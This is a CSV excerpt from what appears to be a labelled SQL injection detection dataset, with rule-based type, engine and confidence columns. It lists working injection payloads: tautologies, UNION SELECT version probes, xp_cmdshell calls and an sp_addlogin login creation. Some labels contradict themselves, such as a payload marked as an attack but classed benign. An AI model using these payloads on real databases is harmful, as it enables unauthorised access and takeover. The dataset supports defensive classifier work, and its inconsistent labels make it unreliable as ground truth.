row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
270,Ã½ or 1 = 1 --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
271,a' --,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
272,or 1 = 1 /*,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
273,"select * from users where id = 1 or 1#"", union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
274,"select * from users where id = '1' union select $ .,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
275,"exec sp_addlogin 'name' , 'password'",1,,rce,generic,0.95,sp_ detected — rce injection (priority 1) on generic,rule-based
276,"select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
277,0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1,,rce,generic,0.95,0x77616974666F722064656C61792027303A303A31302700 detected — rce injection (priority 1) on generic,rule-based
278,"select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
279,"select * from users where id = 1 or @<@ = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@ = 1 union select detected — union_based injection (priority 7) on generic",rule-based
280,group by userid having 1 = 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
281,"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
282,select * from users where id = 1 *1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
283,"select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
284,‘ or 1 = 1 --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
285,"select * from users where id = 1 *\. union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
286,select * from users where id = 1 % ( @ ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
287,or 'a' = 'a,1,,boolean_blind,generic,0.85,or 'a' = 'a detected — boolean_blind injection (priority 8) on generic,rule-based
288,declare @s varchar ( 22 ) select @s =,1,,rce,generic,0.95,declare @s varchar detected — rce injection (priority 1) on generic,rule-based
289,"select * from users where id = 1 union select 1<@,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
290,"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
291,"select * from users where id = 1 or 1#"". union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
292,@variable,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
293,; exec master..xp_cmdshell,1,,rce,mssql,0.95,"xp_cmdshell, exec master detected — rce injection (priority 1) on mssql",rule-based
294,select * from users where id = 1 + ( 1 ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
295,"select * from users where id = 1 union select @ 1$,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
296,"select * from users where id = 1 union select @ 1a,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
297,"select * from users where id = 1 or @$# = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @$# = 1 union select detected — union_based injection (priority 7) on generic",rule-based
298,"select * from users where id = '1' or ( \. ) = 1 union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
299,"select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
